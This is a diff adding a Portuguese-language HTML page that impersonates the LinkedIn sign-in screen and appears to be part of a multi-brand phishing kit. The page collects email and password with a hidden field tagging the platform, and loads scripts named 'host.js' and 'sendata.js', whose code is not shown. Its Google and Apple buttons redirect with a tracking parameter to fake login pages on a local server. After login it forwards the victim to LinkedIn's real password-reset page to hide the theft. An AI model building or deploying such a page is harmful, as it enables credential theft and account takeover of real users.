@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Entrar ou cadastrar-se no Linkedin</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="https://logospng.org/download/linkedin/logo-linkedin-icon-1536.png" type="image/x-icon">
+  
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap');
+    * {
+      box-sizing: border-box;
+    
+    }
+
+    body {
+
+      background: #f3f2ef;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      font-family: "Montserrat", sans-serif;
+    }
+
+    .login-container {
+      background: #fff;
+      padding: 30px;
+      width: 350px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    }
+
+    h2 {
+      margin-bottom: 20px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 10px;
+      border-radius: 30px;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid #888;
+      background: #fff;
+      cursor: pointer;
+      margin-bottom: 10px;
+      gap: 8px;
+    }
+
+    .btn img {
+      width: 20px;
+      height: 20px;
+    }
+
+    .separator {
+      text-align: center;
+      margin: 20px 0;
+      color: #aaa;
+      position: relative;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      width: 45%;
+      height: 1px;
+      background: #ccc;
+    }
+
+    .separator::before {
+      left: 0;
+    }
+
+    .separator::after {
+      right: 0;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border: 1px solid #888;
+      border-radius: 6px;
+    }
+
+    .password-box {
+      position: relative;
+    }
+
+    .password-box a {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 13px;
+      color: #0073b1;
+      text-decoration: none;
+    }
+
+    .link {
+      display: block;
+      margin: 5px 0 10px;
+      color: #0073b1;
+      font-size: 13px;
+      text-decoration: none;
+    }
+
+    .checkbox {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+
+    .checkbox input {
+      margin-right: 8px;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background: #0a66c2;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 30px;
+      cursor: pointer;
+      font-size: 15px;
+    }
+
+    .bottom-text {
+      margin-top: 15px;
+      font-size: 14px;
+      text-align: center;
+    }
+    input{
+      outline: none;
+    }
+
+    .bottom-text a {
+      color: #0073b1;
+      text-decoration: none;
+    }
+    a{
+      text-decoration: none;
+      color: black;
+  
+    }
+    .btn{
+        transition: .2s;
+
+    }
+    
+    .btn:hover{
+      background-color: #0073b127;
+
+    }
+    div header{
+        margin-left: 25px;
+      }
+
+    @media (max-width:600px) {
+      body{
+        background-color: #fff;
+        display: flex;
+        justify-content: start;
+        align-items: flex-start;
+      }
+      .login-container{
+        width: 100%;
+        padding: 5px;
+        box-shadow: none;
+      }
+      input{
+        height: 50px;
+       
+      }
+      .login-btn {
+      height: 50px;
+      }
+      
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <header><img src="https://logos-world.net/wp-content/uploads/2020/05/Linkedin-Logo.png" alt="" width="100px"></header>
+  </div>
+  
+  <div class="login-container">
+    <h2>Entrar</h2>
+
+    <a href="#" class=" google">
+      <button class="btn google">
+      <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/google/google-original.svg" alt="Google">
+      Entrar com o Google
+    </button>
+    </a>
+
+    <a href="../icloud.com/login.html">
+      <button class="btn icloud">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+      Entrar com a Apple
+    </button>
+    </a>
+
+    <div class="separator">ou</div>
+
+    <input type="text" placeholder="E-mail ou telefone" class="inputName">
+    <input type="text" placeholder="E-mail ou telefone" class="platform" value="linkedin" style="display: none;">
+    <div class="password-box">
+      <input type="password" placeholder="Senha" class="inputPass">
+      
+    </div>
+
+    <a href="#" class="link">Esqueceu a senha?</a>
+
+    <label class="checkbox">
+      <input type="checkbox" checked>
+      Me mantenha na conta
+      
+    </label>
+
+    <button class="enviar login-btn">Entrar</button>
+  </div>
+
+  <script src="../host.js"></script>
+  <script src="../sendata.js"></script>
+  <script>
+    
+   document.addEventListener("click",(e)=>{
+    let queryString = window.location.search
+    let params = new URLSearchParams(queryString)
+    let ref = params.get('ref')
+  
+    console.log(e.target.classList)
+    if(e.target.classList[1] === "google"){
+
+      e.preventDefault()
+      location.href = `http://192.168.1.14:5500/d/google.com/login.html?ref=${ref}`
+    }
+     if(e.target.classList[1] === "icloud"){
+
+      e.preventDefault()
+      location.href = `http://192.168.1.14:5500/d/icloud.com/login.html?ref=${ref}`
+    }
+  })
+  
+  document.querySelector(".login-btn").addEventListener("click",()=>{
+    setTimeout(() => {
+      location.href = "https://www.linkedin.com/checkpoint/rp/request-password-reset"
+    }, 500);
+  })
+  
+  
+  </script>
+
+  <p class="bottom-text">Ainda não faz parte do LinkedIn? <a href="#">Cadastre-se agora</a></p>
+</body>
+</html>
